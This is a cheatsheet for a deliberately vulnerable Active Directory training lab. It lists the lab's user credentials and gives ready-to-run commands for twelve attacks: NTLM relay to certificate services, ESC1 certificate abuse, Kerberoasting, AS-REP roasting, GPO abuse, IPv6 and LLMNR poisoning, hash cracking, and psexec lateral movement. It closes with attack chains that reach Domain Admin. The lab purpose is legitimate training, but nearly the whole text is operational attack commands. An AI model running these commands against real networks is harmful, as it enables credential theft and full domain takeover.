# breakingbAD Exploitation Cheatsheet

Quick reference for exploiting all 12 vulnerabilities in the lab.

**Domain:** `breakingbad.local` | **DC:** `192.168.100.10` | **srv01:** `192.168.100.20` | **srv02:** `192.168.100.21`
**Domain Admin:** `Administrator` / `452dvcZ!`

| User | Password | Group |
|------|----------|-------|
| walter.white | 774azeG! | Methcooks |
| jessie.pinkman | 313lksV! | Methcooks |
| saul.goodman | 657crsH! | Lawyers |
| gustavo.fring | 659ldoK! | Distributors |
| hector.salamanca | 346modL! | Distributors |

---

## 01 - ESC8 (ADCS Web Enrollment)

**Target:** dc01 | **What:** NTLM relay to the ADCS HTTP enrollment endpoint to get a certificate as any user.

```bash
# Check if web enrollment is available
curl -k https://192.168.100.10/certsrv/

# Relay NTLM auth to the web enrollment endpoint (attacker must coerce auth first)
ntlmrelayx.py -t http://192.168.100.10/certsrv/certfnsh.asp -smb2support --adcs --template Machine

# Use the obtained certificate to authenticate
certipy auth -pfx dc01.pfx -dc-ip 192.168.100.10
```

---

## 02 - NTLMv1

**Target:** srv01 | **What:** srv01 accepts NTLMv1 authentication. Captured NTLMv1 hashes can be cracked or relayed trivially.

```bash
# Coerce srv01 to authenticate to your listener (e.g. via PetitPotam, PrinterBug)
responder -I eth0 -v

# Or use netexec to check the LM compatibility level
nxc smb 192.168.100.20 -u walter.white -p '774azeG!' --laps

# Crack NTLMv1 hashes (submit to crack.sh or use hashcat)
# NTLMv1 with ESS can be converted to a crackable format at https://crack.sh
hashcat -m 14000 ntlmv1_hash.txt wordlist.txt
```

---

## 03 - WebClient (WebDAV Coercion)

**Target:** srv02 | **What:** WebClient service is running, enabling HTTP-based NTLM coercion (no SMB signing required over HTTP).

```bash
# Verify WebClient is running
nxc smb 192.168.100.21 -u walter.white -p '774azeG!' -M webdav

# Coerce authentication via WebDAV (PetitPotam over HTTP)
PetitPotam.py -u walter.white -p '774azeG!' -d breakingbad.local attacker@80/test 192.168.100.21

# Combine with ntlmrelayx for relay attacks
ntlmrelayx.py -t ldap://192.168.100.10 -smb2support
```

---

## 04 - GPO Abuse

**Target:** dc01 / GPO "Los Pollos Hermanos" | **What:** Authenticated Users have full edit rights on the GPO linked to OU=Cartel. Any domain user can inject a scheduled task for RCE.

```bash
# Enumerate GPO permissions
nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' -M gpo_abuse

# Check with BloodHound
bloodhound-python -u walter.white -p '774azeG!' -d breakingbad.local -dc dc01.breakingbad.local -c all

# Abuse with pyGPOAbuse (add local admin or reverse shell)
pygpoabuse.py breakingbad.local/walter.white:'774azeG!' -gpo-id "$(nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' -M gpo_abuse 2>&1 | grep -oP '{[^}]+}')" \
  -command 'net localgroup Administrators walter.white /add' -taskname 'update' -f

# Or use SharpGPOAbuse from Windows
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount walter.white --GPOName "Los Pollos Hermanos"

# Force gpupdate on target (or wait)
nxc smb 192.168.100.20 -u walter.white -p '774azeG!' -x 'gpupdate /force'
```

---

## 05 - IPv6 Poisoning

**Target:** srv02 | **What:** IPv6 is enabled; an attacker can run a rogue DHCPv6 server to MITM traffic and relay credentials.

```bash
# Trigger: reboot srv02 to generate DHCPv6 requests
./lab.sh vuln trigger 5

# Run mitm6 to become the IPv6 DNS server
mitm6 -d breakingbad.local -i eth0

# Combine with ntlmrelayx to relay captured auth
ntlmrelayx.py -6 -t ldaps://192.168.100.10 -wh fake.breakingbad.local -l loot
```

---

## 06 - LLMNR / NBT-NS / mDNS Poisoning

**Target:** srv02 | **What:** Name resolution fallback protocols are enabled. Respond to broadcast queries to capture NTLMv2 hashes.

```bash
# Trigger: walter.white searches for a non-existent share
./lab.sh vuln trigger 6

# Capture hashes with Responder
responder -I eth0 -dwv

# Crack captured NTLMv2 hashes
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# Or relay instead of cracking
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 07 - Password in User Description

**Target:** dc01 / saul.goodman | **What:** saul.goodman's password is stored in his AD description field. Any authenticated user can read it.

```bash
# Query with netexec
nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' -M get-desc-users

# Query with ldapsearch
ldapsearch -x -H ldap://192.168.100.10 -D 'walter.white@breakingbad.local' -w '774azeG!' \
  -b 'OU=Cartel,DC=breakingbad,DC=local' '(sAMAccountName=saul.goodman)' description

# Or with rpcclient
rpcclient -U 'walter.white%774azeG!' 192.168.100.10 -c 'queryuser saul.goodman'

# Verify the password works
nxc smb 192.168.100.10 -u saul.goodman -p '657crsH!'
```

---

## 08 - Kerberoasting

**Target:** dc01 / hector.salamanca (SPN: HTTP/srv01) | **What:** hector.salamanca has an SPN assigned. Request a TGS ticket and crack it offline.

```bash
# Find kerberoastable users
nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' --kerberoasting kerberoast.txt

# Or with impacket
GetUserSPNs.py breakingbad.local/walter.white:'774azeG!' -dc-ip 192.168.100.10 -request

# Crack the TGS hash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# Verify cracked password
nxc smb 192.168.100.10 -u hector.salamanca -p '346modL!'
```

---

## 09 - ASREPRoasting

**Target:** dc01 / jessie.pinkman | **What:** jessie.pinkman has Kerberos pre-auth disabled. Request an AS-REP without knowing the password and crack it offline.

```bash
# Find users without pre-auth
nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' --asreproast asrep.txt

# Or with impacket (no creds needed if you know the username)
GetNPUsers.py breakingbad.local/jessie.pinkman -dc-ip 192.168.100.10 -no-pass -format hashcat

# Or enumerate all vulnerable users
GetNPUsers.py breakingbad.local/ -dc-ip 192.168.100.10 -usersfile users.txt -no-pass

# Crack the AS-REP hash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Verify cracked password
nxc smb 192.168.100.10 -u jessie.pinkman -p '313lksV!'
```

---

## 10 - ESC1 (Certificate Template Abuse)

**Target:** dc01 | **What:** Vulnerable certificate template allows specifying a Subject Alternative Name (SAN). Request a cert as any user including Domain Admin.

```bash
# Find vulnerable templates
certipy find -u walter.white@breakingbad.local -p '774azeG!' -dc-ip 192.168.100.10 -vulnerable

# Request a certificate as Administrator using the ESC1 template
certipy req -u walter.white@breakingbad.local -p '774azeG!' -dc-ip 192.168.100.10 \
  -target dc01.breakingbad.local -ca breakingbad-DC01-CA -template ESC1 \
  -upn administrator@breakingbad.local

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 192.168.100.10

# Use the NT hash to access the DC
nxc smb 192.168.100.10 -u Administrator -H <nthash> --shares
```

---

## 11 - Anonymous Logon (Pre-Windows 2000)

**Target:** dc01 | **What:** Anonymous Logon is in the Pre-Windows 2000 Compatible Access group. Unauthenticated LDAP enumeration is possible.

```bash
# Enumerate users without credentials
nxc ldap 192.168.100.10 -u '' -p '' --users

# Enumerate with ldapsearch (anonymous bind)
ldapsearch -x -H ldap://192.168.100.10 -b 'DC=breakingbad,DC=local' '(objectClass=user)' sAMAccountName description

# Enumerate with rpcclient
rpcclient -U '' -N 192.168.100.10 -c 'enumdomusers'

# Enumerate with enum4linux-ng
enum4linux-ng -A 192.168.100.10
```

---

## 12 - Shared Local Admin Password

**Target:** srv01 + srv02 | **Creds:** `svc_admin` / `Zomer123!` | **What:** Same local admin account on both servers. Compromise one, move laterally to the other.

```bash
# Verify creds work on both servers
nxc smb 192.168.100.20 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth

# Dump SAM on srv01
nxc smb 192.168.100.20 -u svc_admin -p 'Zomer123!' --local-auth --sam

# Use same creds to move to srv02
nxc smb 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth -x 'whoami'

# Or get a shell with psexec
psexec.py svc_admin:'Zomer123!'@192.168.100.20
psexec.py svc_admin:'Zomer123!'@192.168.100.21
```

---

## Attack Chains

These vulns combine well for demo scenarios:

**Chain 1: Poisoning to Domain Admin**
`06 (Responder) -> crack hash -> 04 (GPO abuse) -> local admin on srv01 -> 12 (lateral to srv02)`

**Chain 2: ADCS Escalation**
`09 (ASREPRoast jessie) -> auth as jessie -> 10 (ESC1 cert as Admin) -> Domain Admin`

**Chain 3: Relay Attack**
`03 (WebClient coerce srv02) -> 01 (relay to ADCS web enrollment) -> cert as machine -> DCSync`

**Chain 4: Recon to Lateral Movement**
`11 (anon enum users) -> 07 (find saul's password in description) -> 08 (kerberoast hector) -> 12 (shared admin -> lateral)`
